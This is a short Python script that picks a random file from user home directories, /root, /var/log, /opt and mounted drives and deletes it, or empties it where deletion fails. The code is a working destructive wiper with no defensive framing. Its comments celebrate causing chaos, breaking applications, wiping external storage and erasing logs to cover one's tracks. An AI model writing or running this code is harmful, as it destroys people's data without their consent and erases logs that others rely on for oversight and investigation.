import os
import random

def overwrite_file(file_path):
    """Overwrites a file with blank content instead of deleting it."""
    try:
        with open(file_path, "w") as f:
            f.write("")  # Writing an empty string clears the file
            print(f"Deleted: {file_path}")
    except Exception as e:
        pass


def get_random_files(search_paths, excluded_dirs, num_files=5):
    """Finds random files from given search paths."""
    all_files = []
    for path in search_paths:
        for root, _, files in os.walk(path):
            if any(excluded in root for excluded in excluded_dirs):
                continue  # Skip excluded directories
            for file in files:
                all_files.append(os.path.join(root, file))

    if not all_files:
        return []

    return random.sample(all_files, min(num_files, len(all_files)))  # Pick random files safely

def delete_or_overwrite(file_path):
    """Attempts to delete a file; if deletion fails, overwrites it."""
    try:
        os.remove(file_path)
        print(f"Deleted: {file_path}")
    except Exception as e:
        overwrite_file(file_path)

# Define search paths (be careful!)
search_paths = [
    "/home",        # User directories (deleting personal files = chaos)
    "/root",        # Superuser home directory
    "/var/log",     # Logs (deleting logs can cover your tracks)
    "/var/tmp",     # Temporary files that persist between reboots
    "/opt",         # Third-party software (deleting breaks apps)
    "/mnt", "/media"  # Mounted drives (potentially deleting external storage)
]
# Define directories to exclude
excluded_dirs = ["/proc", "/usr", "/snap", "/sys",]

# Get random files and process them
files_to_process = get_random_files(search_paths, excluded_dirs, num_files=1)
for file in files_to_process:
    delete_or_overwrite(file)  # Process each file individually